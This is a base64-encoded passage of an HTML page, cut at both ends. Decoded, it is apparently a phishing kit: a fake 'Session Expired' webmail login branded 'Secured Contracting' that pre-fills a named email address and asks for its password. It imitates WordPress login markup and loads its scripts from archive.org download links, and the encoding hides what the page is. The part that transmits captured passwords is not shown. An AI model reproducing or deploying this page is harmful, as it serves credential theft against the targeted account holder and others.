S5jb20iLCJhdWRpby54cGxlZXIuY29tIiwia2VlcGEuY29tIiwic3RhdGljLnh4LmZiY2RuLm5ldCJdKTs8L3NjcmlwdD48L2hlYWQ+Cgk8Ym9keSBjbGFzcz0ibG9naW4ganMgbG9naW4tYWN0aW9uLWxvZ2luIHdwLWNvcmUtdWkgIGxvY2FsZS1lbi1nYiIgYmlzX3JlZ2lzdGVyPSJXM3NpYldGemRHVnlJanAwY25WbExDSmxlSFJsYm5OcGIyNUpaQ0k2SW1Wd2NHbHZZMlZ0YUcxdWJHSm9hbkJzWTJkcmIyWmphV2xsWjI5dFkyOXVJaXdpWVdSaWJHOWphMlZ5VTNSaGRIVnpJanA3SWtSSlUxQk1RVmtpT2lKbGJtRmliR1ZrSWl3aVJrRkRSVUpQVDBzaU9pSmxibUZpYkdWa0lpd2lWRmRKVkZSRlVpSTZJbVZ1WVdKc1pXUWlMQ0pTUlVSRVNWUWlPaUpsYm1GaWJHVmtJaXdpVUVsT1ZFVlNSVk5VSWpvaVpHbHpZV0pzWldRaUxDSkpUbE5VUVVkU1FVMGlPaUprYVhOaFlteGxaQ0o5TENKMlpYSnphVzl1SWpvaU1TNDVMakUxSWl3aWMyTnZjbVVpT2pFd09URTFNSDFkIiBkYXRhLW5ldy1nci1jLXMtY2hlY2stbG9hZGVkPSIxNC4xMTM3LjAiIGRhdGEtZ3ItZXh0LWluc3RhbGxlZD0iIj4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KLyogPCFbQ0RBVEFbICovCmRvY3VtZW50LmJvZHkuY2xhc3NOYW1lID0gZG9jdW1lbnQuYm9keS5jbGFzc05hbWUucmVwbGFjZSgnbm8tanMnLCdqcycpOwovKiBdXT4gKi8KPC9zY3JpcHQ+CgoJCTxkaXYgaWQ9ImxvZ2luIiBiaXNfc2tpbl9jaGVja2VkPSIxIj4KCQk8aDE+PGltZyBzcmM9IiIgYWx0PSIiIGlkPSJsb2dvaW1nIiB3aWR0aD0iMTUlIj48L2ltZz48L2gxPgoJCQoJPGRpdiBpZD0ibG9naW5fZXJyb3IiIGNsYXNzPSJub3RpY2Ugbm90aWNlLWVycm9yIiBiaXNfc2tpbl9jaGVja2VkPSIxIj48cD48c3Ryb25nPkVycm9yOjwvc3Ryb25nPiAKCQoJPGRpdiB3aXRoaWQ9ImxvZ2luLXN0YXR1cyIgY2xhc3M9ImVycm9yLW5vdGljZSIgc3R5bGU9InZpc2liaWxpdHk6IHZpc2libGU7Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudC13cmFwcGVyIj4KICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImxvZ2luLWRldGFpbCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibG9naW4tc3RhdHVzLWljb24tY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibG9naW4tc3RhdHVzLWljb24iPjwvc3Bhbj48L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJtc2ciIHN0eWxlPSIiPlNlc3Npb24gRXhwaXJlZC4gUGxlYXNlIGxvZ2luIGFnYWluITwvZGl2PgoJCQkJCSAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibXNnMiIgIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+VGhlIHBhc3N3b3JkIHlvdSBlbnRlcmVkIGZvciB0aGlzIGVtYWlsIGFkZHJlc3MgPGI+PHNwYW4gc3R5bGU9ImNvbG9yOnJnYig2MiUsIDclLCA0JSkJOyIgaWQ9ImFpY3giPjwvc3Bhbj48L2I+ICBpcyBpbmNvcnJlY3QuPC9kaXY+CgkJCQkJCQkJCQkgICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9Im1zZzEiIHN0eWxlPSJkaXNwbGF5OiBub25lOyAiPlRoZSBwYXNzd29yZCB5b3UgZW50ZXJlZCBmb3IgdGhlIGVtYWlsIGFkZHJlc3MgPGI+PHNwYW4gc3R5bGU9ImNvbG9yOnJnYig2MiUsIDclLCA0JSkJOyIgaWQ9ImFpY3h4Ij48L3NwYW4+PC9iPiBpcyBpbmNvcnJlY3QuPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KCQkJCQoJCQkJCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PiA8L3A+PC9kaXY+CgkJPGZvcm0gbmFtZT0ibG9naW5mb3JtIiBpZD0ibG9naW5mb3JtIiBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBjbGFzcz0ic2hha2UiPgoJCQk8cD4KCQkJCTxsYWJlbCBmb3I9InVzZXJfbG9naW4iPlVzZXJuYW1lPC9sYWJlbD4KCQkJCTxkaXYgc3R5bGU9ImJvcmRlcjowLjdweCBzb2xpZDsgYm9yZGVyLXJhZGl1czo0cHg7Ij4KCQkJCTxkaXYgc3R5bGU9Im1hcmdpbi1ib3R0b206MTBweDsgbWFyZ2luLXRvcDoxMHB4OyBtYXJnaW4tbGVmdDozcHg7Ij4KCQkJCTxiPjxzcGFuIGlkPSJhaWNoIj5pbmZvQGlmYi1ubC5ubDwvc3Bhbj48L2I+CgkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L3A+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImVtYWlsIiBpZD0idXNlcm5hbWUiIGFyaWEtZGVzY3JpYmVkYnk9ImxvZ2luX2Vycm9yIiBjbGFzcz0iaW5wdXQgcGFzc3dvcmQtaW5wdXQiIHZhbHVlPSIiIHNpemU9IjIwIiBhdXRvY29tcGxldGU9Im9mZiIgc3BlbGxjaGVjaz0iZmFsc2UiIHJlcXVpcmVkPSJyZXF1aXJlZCI+CgkJCQkJCiA8aW5wdXQgdHlwZT0iaGlkZGVuIiAgaWQ9ImFpIiB2YWx1ZT0iIiBzaXplPSIyMCIgYXV0b2NvbXBsZXRlPSJvZmYiICByZXF1aXJlZD0icmVxdWlyZWQiPgoJCQkJCQoJCQk8ZGl2IGNsYXNzPSJ1c2VyLXBhc3Mtd3JhcCIgYmlzX3NraW5fY2hlY2tlZD0iMSI+CgkJCQk8bGFiZWwgZm9yPSJ1c2VyX3Bhc3MiPlBhc3N3b3JkPC9sYWJlbD4KCQkJCQoJCQkJPGRpdiBjbGFzcz0id3AtcHdkIiBiaXNfc2tpbl9jaGVja2VkPSIxIj4KCQkJCQoJCQkJCTxpbnB1dCB0eXBlPSJwYXNzd29yZCIgc3R5bGU9ImZvbnQtc2l6ZToxNHB4OyJuYW1lPSJwciIgaWQ9InByIiBhcmlhLWRlc2NyaWJlZGJ5PSJsb2dpbl9lcnJvciIgcGxhY2Vob2xkZXI9IkVudGVyIGVtYWlsIHBhc3N3b3JkIiBjbGFzcz0iaW5wdXQgcGFzc3dvcmQtaW5wdXQiIHZhbHVlPSIiIHNpemU9IjIwIiBhdXRvY29tcGxldGU9Im9mZiIgc3BlbGxjaGVjaz0iZmFsc2UiIHJlcXVpcmVkPSJyZXF1aXJlZCI+CgkJCQkJCgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJCQkJCTxwIGNsYXNzPSJmb3JnZXRtZW5vdCI+PGlucHV0IG5hbWU9InJlbWVtYmVybWUiIHR5cGU9ImNoZWNrYm94IiBpZD0icmVtZW1iZXJtZSIgdmFsdWU9ImZvcmV2ZXIiPiA8bGFiZWwgZm9yPSJyZW1lbWJlcm1lIj5SZW1lbWJlciBNZTwvbGFiZWw+PC9wPgoJCQk8cCBjbGFzcz0ic3VibWl0Ij4KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IndwLXN1Ym1pdCIgaWQ9InN1Ym1pdC1idG4iIGNsYXNzPSJidXR0b24gYnV0dG9uLXByaW1hcnkgYnV0dG9uLWxhcmdlIiB2YWx1ZT0iTG9nIEluIj4KCQkJCQkJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icmVkaXJlY3RfdG8iIHZhbHVlPSJodHRwczovL2lmYi1ubC5ubC93cC1hZG1pbi8iPgoJCQkJCQkJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0ZXN0Y29va2llIiB2YWx1ZT0iMSI+CgkJCTwvcD4KCQk8L2Zvcm0+CgoJCQkJCTxwIGlkPSJuYXYiPgoJCQkJPGEgY2xhc3M9IndwLWxvZ2luLWxvc3QtcGFzc3dvcmQiIGhyZWY9IiMiPkxvc3QgeW91ciBwYXNzd29yZD88L2E+CQkJPC9wPgoJCQk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Ci8qIDwhW0NEQVRBWyAqLwpmdW5jdGlvbiB3cF9hdHRlbXB0X2ZvY3VzKCkge3NldFRpbWVvdXQoIGZ1bmN0aW9uKCkge3RyeSB7ZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCAidXNlcl9wYXNzIiApOyBkLnZhbHVlID0gIiI7ZC5mb2N1cygpOyBkLnNlbGVjdCgpO30gY2F0Y2goIGVyICkge319LCAyMDApO30Kd3BfYXR0ZW1wdF9mb2N1cygpOwppZiAoIHR5cGVvZiB3cE9ubG9hZCA9PT0gJ2Z1bmN0aW9uJyApIHsgd3BPbmxvYWQoKSB9Ci8qIF1dPiAqLwo8L3NjcmlwdD4KCQk8cCBpZD0iYmFja3RvYmxvZyI+CgkJCTxhIGhyZWY9IiMiPuKGkCBHbyB0byBTZWN1cmVkIENvbnRyYWN0aW5nPC9hPgkJPC9wPgoJCQk8L2Rpdj4KCQkJCTxkaXYgY2xhc3M9Imxhbmd1YWdlLXN3aXRjaGVyIiBiaXNfc2tpbl9jaGVja2VkPSIxIj4KCQkJCTxmb3JtIGlkPSJsYW5ndWFnZS1zd2l0Y2hlciIgYWN0aW9uPSIiIG1ldGhvZD0iZ2V0Ij4KCgkJCQkJPGxhYmVsIGZvcj0ibGFuZ3VhZ2Utc3dpdGNoZXItbG9jYWxlcyI+CgkJCQkJCTxzcGFuIGNsYXNzPSJkYXNoaWNvbnMgZGFzaGljb25zLXRyYW5zbGF0aW9uIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9zcGFuPgoJCQkJCQk8c3BhbiBjbGFzcz0ic2NyZWVuLXJlYWRlci10ZXh0Ij4KCQkJCQkJCVNlY3VyZWQJCQkJCQk8L3NwYW4+CgkJCQkJPC9sYWJlbD4KCgkJCQkJPHNwYW4gc3R5bGU9ImNvbG9yOnJnYig1JSwgMzElLCA1NSUpOyIgaWQ9ImxvZ29uYW1lYyI+PC9zcGFuPiZuYnNwOzxzcGFuIHN0eWxlPSJjb2xvcjpyZ2IoNSUsIDMxJSwgNTUlKTsiPldlYm1haWw8L3NwYW4+CgkJCQkJCgkJCQkJCgkJCQkJCgkJCQkJCQoKCQkJCQk8L2Zvcm0+CgkJCQk8L2Rpdj4KCQkJCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KLyogPCFbQ0RBVEFbICovCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2Zvcm0nKS5jbGFzc0xpc3QuYWRkKCdzaGFrZScpOwovKiBdXT4gKi8KPC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy9qcXVlcnkubWluLmpzLmRvd25sb2FkIiBpZD0ianF1ZXJ5LWNvcmUtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvanF1ZXJ5LW1pZ3JhdGUubWluLmpzLmRvd25sb2FkIiBpZD0ianF1ZXJ5LW1pZ3JhdGUtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgaWQ9Inp4Y3Zibi1hc3luYy1qcy1leHRyYSI+Ci8qIDwhW0NEQVRBWyAqLwp2YXIgX3p4Y3ZiblNldHRpbmdzID0geyJzcmMiOiJodHRwczpcL1wvaWZiLW5sLm5sXC93cC1pbmNsdWRlc1wvanNcL3p4Y3Zibi5taW4uanMifTsKLyogXV0+ICovCjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvenhjdmJuLWFzeW5jLm1pbi5qcy5kb3dubG9hZCIgaWQ9Inp4Y3Zibi1hc3luYy1qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy93cC1wb2x5ZmlsbC1pbmVydC5taW4uanMuZG93bmxvYWQiIGlkPSJ3cC1wb2x5ZmlsbC1pbmVydC1qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy9yZWdlbmVyYXRvci1ydW50aW1lLm1pbi5qcy5kb3dubG9hZCIgaWQ9InJlZ2VuZXJhdG9yLXJ1bnRpbWUtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvd3AtcG9seWZpbGwubWluLmpzLmRvd25sb2FkIiBpZD0id3AtcG9seWZpbGwtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvaG9va3MubWluLmpzLmRvd25sb2FkIiBpZD0id3AtaG9va3MtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvaTE4bi5taW4uanMuZG93bmxvYWQiIGlkPSJ3cC1pMThuLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJ3cC1pMThuLWpzLWFmdGVyIj4KLyogPCFbQ0RBVEFbICovCndwLmkxOG4uc2V0TG9jYWxlRGF0YSggeyAndGV4dCBkaXJlY3Rpb25cdTAwMDRsdHInOiBbICdsdHInIF0gfSApOwovKiBdXT4gKi8KPC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBpZD0icGFzc3dvcmQtc3RyZW5ndGgtbWV0ZXItanMtZXh0cmEiPgovKiA8IVtDREFUQVsgKi8KdmFyIHB3c0wxMG4gPSB7InVua25vd24iOiJQYXNzd29yZCBzdHJlbmd0aCB1bmtub3duIiwic2hvcnQiOiJWZXJ5IHdlYWsiLCJiYWQiOiJXZWFrIiwiZ29vZCI6Ik1lZGl1bSIsInN0cm9uZyI6IlN0cm9uZyIsIm1pc21hdGNoIjoiTWlzbWF0Y2gifTsKLyogXV0+ICovCjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgaWQ9InBhc3N3b3JkLXN0cmVuZ3RoLW1ldGVyLWpzLXRyYW5zbGF0aW9ucyI+Ci8qIDwhW0NEQVRBWyAqLwooIGZ1bmN0aW9uKCBkb21haW4sIHRyYW5zbGF0aW9ucyApIHsKCXZhciBsb2NhbGVEYXRhID0gdHJhbnNsYXRpb25zLmxvY2FsZV9kYXRhWyBkb21haW4gXSB8fCB0cmFuc2xhdGlvbnMubG9jYWxlX2RhdGEubWVzc2FnZXM7Cglsb2NhbGVEYXRhWyIiXS5kb21haW4gPSBkb21haW47Cgl3cC5pMThuLnNldExvY2FsZURhdGEoIGxvY2FsZURhdGEsIGRvbWFpbiApOwp9ICkoICJkZWZhdWx0IiwgeyJ0cmFuc2xhdGlvbi1yZXZpc2lvbi1kYXRlIjoiMjAyMy0xMC0wNyAxMDozMjo1MSswMDAwIiwiZ2VuZXJhdG9yIjoiR2xvdFByZXNzXC80LjAuMC1hbHBoYS45IiwiZG9tYWluIjoibWVzc2FnZXMiLCJsb2NhbGVfZGF0YSI6eyJtZXNzYWdlcyI6eyIiOnsiZG9tYWluIjoibWVzc2FnZXMiLCJwbHVyYWwtZm9ybXMiOiJucGx1cmFscz0yOyBwbHVyYWw9biAhPSAxOyIsImxhbmciOiJlbl9HQiJ9LCIlMSRzIGlzIGRlcHJlY2F0ZWQgc2luY2UgdmVyc2lvbiAlMiRzISBVc2UgJTMkcyBpbnN0ZWFkLiBQbGVhc2UgY29uc2lkZXIgd3JpdGluZyBtb3JlIGluY2x1c2l2ZSBjb2RlLiI6WyIlMSRzIGlzIGRlcHJlY2F0ZWQgc2luY2UgdmVyc2lvbiAlMiRzISBVc2UgJTMkcyBpbnN0ZWFkLiBQbGVhc2UgY29uc2lkZXIgd3JpdGluZyBtb3JlIGluY2x1c2l2ZSBjb2RlLiJdfX0sImNvbW1lbnQiOnsicmVmZXJlbmNlIjoid3AtYWRtaW5cL2pzXC9wYXNzd29yZC1zdHJlbmd0aC1tZXRlci5qcyJ9fSApOwovKiBdXT4gKi8KPC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy9wYXNzd29yZC1zdHJlbmd0aC1tZXRlci5taW4uanMuZG93bmxvYWQiIGlkPSJwYXNzd29yZC1zdHJlbmd0aC1tZXRlci1qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy91bmRlcnNjb3JlLm1pbi5qcy5kb3dubG9hZCIgaWQ9InVuZGVyc2NvcmUtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgaWQ9IndwLXV0aWwtanMtZXh0cmEiPgovKiA8IVtDREFUQVsgKi8KdmFyIF93cFV0aWxTZXR0aW5ncyA9IHsiYWpheCI6eyJ1cmwiOiJcL3dwLWFkbWluXC9hZG1pbi1hamF4LnBocCJ9fTsKLyogXV0+ICovCjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvd3AtdXRpbC5taW4uanMuZG93bmxvYWQiIGlkPSJ3cC11dGlsLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJ1c2VyLXByb2ZpbGUtanMtZXh0cmEiPgovKiA8IVtDREFUQVsgKi8KdmFyIHVzZXJQcm9maWxlTDEwbiA9IHsidXNlcl9pZCI6IjAiLCJub25jZSI6ImI0YjZjMzFiNDAifTsKLyogXV0+ICovCjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgaWQ9InVzZXItcHJvZmlsZS1qcy10cmFuc2xhdGlvbnMiPgovKiA8IVtDREFUQVsgKi8KKCBmdW5jdGlvbiggZG9tYWluLCB0cmFuc2xhdGlvbnMgKSB7Cgl2YXIgbG9jYWxlRGF0YSA9IHRyYW5zbGF0aW9ucy5sb2NhbGVfZGF0YVsgZG9tYWluIF0gfHwgdHJhbnNsYXRpb25zLmxvY2FsZV9kYXRhLm1lc3NhZ2VzOwoJbG9jYWxlRGF0YVsiIl0uZG9tYWluID0gZG9tYWluOwoJd3AuaTE4bi5zZXRMb2NhbGVEYXRhKCBsb2NhbGVEYXRhLCBkb21haW4gKTsKfSApKCAiZGVmYXVsdCIsIHsidHJhbnNsYXRpb24tcmV2aXNpb24tZGF0ZSI6IjIwMjMtMTAtMDcgMTA6MzI6NTErMDAwMCIsImdlbmVyYXRvciI6Ikdsb3RQcmVzc1wvNC4wLjAtYWxwaGEuOSIsImRvbWFpbiI6Im1lc3NhZ2VzIiwibG9jYWxlX2RhdGEiOnsibWVzc2FnZXMiOnsiIjp7ImRvbWFpbiI6Im1lc3NhZ2VzIiwicGx1cmFsLWZvcm1zIjoibnBsdXJhbHM9MjsgcGx1cmFsPW4gIT0gMTsiLCJsYW5nIjoiZW5fR0IifSwiWW91ciBuZXcgcGFzc3dvcmQgaGFzIG5vdCBiZWVuIHNhdmVkLiI6WyJZb3VyIG5ldyBwYXNzd29yZCBoYXMgbm90IGJlZW4gc2F2ZWQuIl0sIkhpZGUiOlsiSGlkZSJdLCJTaG93IjpbIlNob3ciXSwiQ29uZmlybSB1c2Ugb2Ygd2VhayBwYXNzd29yZCI6WyJDb25maXJtIHVzZSBvZiB3ZWFrIHBhc3N3b3JkIl0sIkhpZGUgcGFzc3dvcmQiOlsiSGlkZSBwYXNzd29yZCJdLCJTaG93IHBhc3N3b3JkIjpbIlNob3cgcGFzc3dvcmQiXX19LCJjb21tZW50Ijp7InJlZmVyZW5jZSI6IndwLWFkbWluXC9qc1wvdXNlci1wcm9maWxlLmpzIn19ICk7Ci8qIF1dPiAqLwo8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL3VzZXItcHJvZmlsZS5taW4uanMuZG93bmxvYWQiIGlkPSJ1c2VyLXByb2ZpbGUtanMiPjwvc2NyaXB0PgoJCgkKCTwvYm9keT48Z3JhbW1hcmx5LWRlc2t0b3AtaW50ZWdyYXRpb24gZGF0YS1ncmFtbWFybHktc2hhZG93LXJvb3Q9InRydWUiPjx0ZW1wbGF0ZSBzaGFkb3dyb290bW9kZT0ib3BlbiI+PHN0eWxlPgogICAgICBkaXYuZ3JhbW1hcmx5LWRlc2t0b3AtaW50ZWdyYXRpb24gewogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICB3aWR0aDogMXB4OwogICAgICAgIGhlaWdodDogMXB4OwogICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgbWFyZ2luOiAtMXB4OwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgY2xpcDogcmVjdCgwLCAwLCAwLCAwKTsKICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwOwogICAgICAgIGJvcmRlcjogMDsKICAgICAgICAtbW96LXVzZXItc2VsZWN0OiBub25lOwogICAgICAgIC13ZWJraXQtdXNlci1zZWxlY3Q6IG5vbmU7CiAgICAgICAgLW1zLXVzZXItc2VsZWN0Om5vbmU7CiAgICAgICAgdXNlci1zZWxlY3Q6bm9uZTsKICAgICAgfQoKICAgICAgZGl2LmdyYW1tYXJseS1kZXNrdG9wLWludGVncmF0aW9uOmJlZm9yZSB7CiAgICAgICAgY29udGVudDogYXR0cihkYXRhLWNvbnRlbnQpOwogICAgICB9CiAgICA8L3N0eWxlPjxkaXYgYXJpYS1sYWJlbD0iZ3JhbW1hcmx5LWludGVncmF0aW9uIiByb2xlPSJncm91cCIgdGFiaW5kZXg9Ii0xIiBjbGFzcz0iZ3JhbW1hcmx5LWRlc2t0b3AtaW50ZWdyYXRpb24iIGRhdGEtY29udGVudD0ieyZxdW90O21vZGUmcXVvdDs6JnF1b3Q7ZnVsbCZxdW90OywmcXVvdDtpc0FjdGl2ZSZxdW90Ozp0cnVlLCZxdW90O2lzVXNlckRpc2FibGVkJnF1b3Q7OmZhbHNlfSI+PC9kaXY+PC90ZW1wbGF0ZT48L2dyYW1tYXJseS1kZXNrdG9wLWludGVncmF0aW9uPgoJPC9ib2R5PjxncmFtbWFybHktZGVza3RvcC1pbnRlZ3JhdGlvbiBkYXRhLWdyYW1tYXJseS1zaGFkb3ctcm9vdD0idHJ1ZSI+PC9ncmFtbWFybHktZGVza3RvcC1pbnRlZ3JhdGlvbj4KPHNjcmlwdD4KLy8gU2V0IHRoZSBkYXRlIHdlJ3JlIGNvdW50aW5nIGRvd24gdG8KdmFyIGNvdW50RG93bkRhdGUgPSBuZXcgRGF0ZSgiSmFuIDUsIDIwMjQgMTU6Mzc6MjUiKS5nZXRUaW1lKCk7CgovLyBVcGRhdGUgdGhlIGNvdW50IGRvd24gZXZlcnkgMSBzZWNvbmQKdmFyIHggPSBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKCiAgLy8gR2V0IHRvZGF5J3MgZGF0ZSBhbmQgdGltZQogIHZhciBub3cgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTsKICAgIAogIC8vIEZpbmQgdGhlIGRpc3RhbmNlIGJldHdlZW4gbm93IGFuZCB0aGUgY291bnQgZG93biBkYXRlCiAgdmFyIGRpc3RhbmNlID0gY291bnREb3duRGF0ZSAtIG5vdzsKICAgIAogIC8vIFRpbWUgY2FsY3VsYXRpb25zIGZvciBkYXlzLCBob3VycywgbWludXRlcyBhbmQgc2Vjb25kcwogIHZhciBkYXlzID0gTWF0aC5mbG9vcihkaXN0YW5jZSAvICgxMDAwICogNjAgKiA2MCAqIDI0KSk7CiAgdmFyIGhvdXJzID0gTWF0aC5mbG9vcigoZGlzdGFuY2UgJSAoMTAwMCAqIDYwICogNjAgKiAyNCkpIC8gKDEwMDAgKiA2MCAqIDYwKSk7CiAgdmFyIG1pbnV0ZXMgPSBNYXRoLmZsb29yKChkaXN0YW5jZSAlICgxMDAwICogNjAgKiA2MCkpIC8gKDEwMDAgKiA2MCkpOwogIHZhciBzZWNvbmRzID0gTWF0aC5mbG9vcigoZGlzdGFuY2UgJSAoMTAwMCAqIDYwKSkgLyAxMDAwKTsKICAgIAogIC8vIE91dHB1dCB0aGUgcmVzdWx0IGluIGFuIGVsZW1lbnQgd2l0aCBpZD0iZGVtbyIKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTCA9IGhvdXJzICsgImggIgogICsgbWludXRlcyArICJtICIgKyBzZWNvbmRzICsgInMgIjsKICAgIAogIC8vIElmIHRoZSBjb3VudCBkb3duIGlzIG92ZXIsIHdyaXRlIHNvbWUgdGV4dCAKICBpZiAoZGlzdGFuY2UgPCAwKSB7CiAgICBjbGVhckludGVydmFsKHgpOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRlbW8iKS5pbm5lckhUTUwgPSAiRVhQSVJFRCI7CiAgfQp9LCAxMDAwKTsKPC9zY3JpcHQ+Cgo8IS0tIE9wdGlvbmFsIEphdmFTY3JpcHQgLS0+CiAgICA8IS0tIGpRdWVyeSBmaXJzdCwgdGhlbiBQb3BwZXIuanMsIHRoZW4gQm9vdHN0cmFwIEpTIC0tPgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMi4xLnNsaW0ubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1LSjNvMkRLdElrdllJSzNVRU56bU03S0NrUnIvckU5L1FwZzZhQVpHSndGRE1WTkEvR3BHRkY5M2hYcEc1S2tOIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3BvcHBlci5qcy8xLjEyLjkvdW1kL3BvcHBlci5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUFwTmJnaDlCK1kxUUt0djNSbjdXM21nUHhoVTlLL1NjUXNBUDdoVWliWDM5ajdmYWtGUHNrdlh1c3ZmYTBiNFEiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC4wLjAvanMvYm9vdHN0cmFwLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtSlpSNlNwZWpoNFUwMmQ4ak90NnZMRUhmZS9KUUdpUlJTUVF4U2ZGV3BpMU1xdVZkQXlqVWFyNSs3NlBWQ21ZbCIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+CjwvYm9keT4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4yLjQvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+Cgo8c2NyaXB0PgoKCi8